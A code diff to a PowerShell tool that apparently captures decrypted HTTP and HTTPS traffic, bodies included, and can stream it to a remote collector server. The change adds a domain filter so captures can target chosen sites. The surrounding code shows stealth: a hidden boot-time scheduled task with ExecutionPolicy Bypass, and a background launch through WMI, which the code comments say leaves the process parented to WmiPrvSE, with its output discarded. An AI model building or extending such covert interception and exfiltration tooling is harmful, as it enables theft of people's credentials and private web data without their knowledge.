@@ -38,6 +38,7 @@ param(
   [int]$Seconds = 0,
   [int]$TrimBody = 0,        # 0 = show the whole body; >0 = trim each body to N chars
   [string]$Server = '',     # collector URL, e.g. http://host:8771; streams captures there as JSON
+  [string[]]$Domains = @(), # only show/send transactions for these domains (e.g. -Domains google.com,github.com); empty = all
   [switch]$NoInstall,
   [switch]$Uninstall,
   [switch]$SelfTest,        # generate a few HTTP/HTTPS requests so there is traffic to show
@@ -86,6 +87,7 @@ if (-not (New-Object Security.Principal.WindowsPrincipal($id)).IsInRole(
   if ($PSBoundParameters.ContainsKey('Seconds'))  { $a += @('-Seconds',"$Seconds") }
   if ($PSBoundParameters.ContainsKey('TrimBody')) { $a += @('-TrimBody',"$TrimBody") }
   if ($Server)     { $a += @('-Server',$Server) }
+  if ($Domains)    { $a += @('-Domains', ($Domains -join ',')) }
   if ($NoInstall)  { $a += '-NoInstall' }
   if ($Uninstall)  { $a += '-Uninstall' }
   if ($SelfTest)   { $a += '-SelfTest' }
@@ -94,6 +96,12 @@ if (-not (New-Object Security.Principal.WindowsPrincipal($id)).IsInRole(
   Start-Process -FilePath 'powershell.exe' -Verb RunAs -ArgumentList $a
   return
 }
+
+# Normalize -Domains into a clean, lowercased list. Accepts both array form
+# (-Domains a,b) and a single comma-separated string (-Domains "a,b").
+$script:Domains = @($Domains | ForEach-Object { $_ -split ',' } |
+                    ForEach-Object { $_.Trim().ToLowerInvariant().TrimStart('*','.') } |
+                    Where-Object { $_ })
 
 # ---------------------------------------------------------------------------
 # The reader / arming engine (shared memory only, no driver handle needed).
@@ -428,6 +436,7 @@ function New-PersistenceTask {
   $argline = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`" -NoInstall -Seconds 0"
   if ($Server)         { $argline += " -Server `"$Server`"" }
   if ($TrimBody -gt 0) { $argline += " -TrimBody $TrimBody" }
+  if ($Domains)        { $argline += " -Domains `"$($script:Domains -join ',')`"" }
   try {
     $action    = New-ScheduledTaskAction -Execute $pwsh -Argument $argline
     # Start 90s AFTER boot, not AtStartup: the service and networking need to be
@@ -474,6 +483,7 @@ if ($Background) {
   if ($NoInstall)      { $inner += ' -NoInstall' }
   if ($Server)         { $inner += " -Server '$Server'" }
   if ($TrimBody -gt 0) { $inner += " -TrimBody $TrimBody" }
+  if ($Domains)        { $inner += " -Domains '$($script:Domains -join ',')'" }
   $inner += ' *> $null'
   $cl = "`"$pwsh`" -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$inner`""
   # Spawn via WMI Win32_Process.Create: the child is parented to WmiPrvSE, so it
@@ -671,6 +681,24 @@ function Now-Ms { [int64]([DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()) }
 $script:Settle = 500
 $script:Grace  = 2500
 
+# When -Domains is set, keep only transactions whose host matches one of them.
+# A domain matches the exact host or any subdomain (google.com -> www.google.com).
+# The host is taken from the URL, the "Host:" request header, or the Host field.
+function Test-DomainMatch($c) {
+  if (-not $script:Domains -or $script:Domains.Count -eq 0) { return $true }
+  $cands = New-Object System.Collections.Generic.List[string]
+  if ($c.Url -match '^(?i)https?://([^/:]+)')          { $cands.Add($Matches[1]) }
+  if ($c.ReqHeaders -match '(?im)^Host:\s*([^\r\n:]+)') { $cands.Add($Matches[1]) }
+  if ($c.Host -and $c.Host -notmatch '^\d{1,3}(\.\d{1,3}){3}') { $cands.Add(($c.Host -split ':')[0]) }
+  foreach ($h in $cands) {
+    $h = $h.Trim().ToLowerInvariant()
+    foreach ($d in $script:Domains) {
+      if ($h -eq $d -or $h.EndsWith('.' + $d)) { return $true }
+    }
+  }
+  return $false
+}
+
 function Flush-Settled([bool]$final) {
   $now = Now-Ms
   $send = @()
@@ -681,8 +709,10 @@ function Flush-Settled([bool]$final) {
     $hasResp = [bool]($c.ResHeaders -or $c.ResBody -or $c.Status)
     $quiet   = ($now - $c.Updated) -ge $script:Settle
     if ($hasReq -and $hasResp -and ($quiet -or $final)) {
-      Print-Txn $c
-      if ($Server) { $send += $c }
+      if (Test-DomainMatch $c) {                # -Domains filter (no-op when empty)
+        Print-Txn $c
+        if ($Server) { $send += $c }
+      }
       $script:txns.Remove($key)
     } elseif ($final -or (($now - $c.First) -ge $script:Grace)) {
       $script:txns.Remove($key)                 # one-sided and out of time, drop it
@@ -863,6 +893,7 @@ if ($Server) {
 # ---------------------------------------------------------------------------
 Write-Host ''
 Write-Host "[reading] HTTP + HTTPS transactions$(if ($Seconds -gt 0) { " for ${Seconds}s" } else { ' (Ctrl+C to stop)' })" -ForegroundColor White
+if ($script:Domains.Count) { Write-Host "    domain filter: only $($script:Domains -join ', ')" -ForegroundColor DarkGray }
 
 $cap    = [int]$ring.H.Capacity
 $stride = [int]$ring.H.Stride
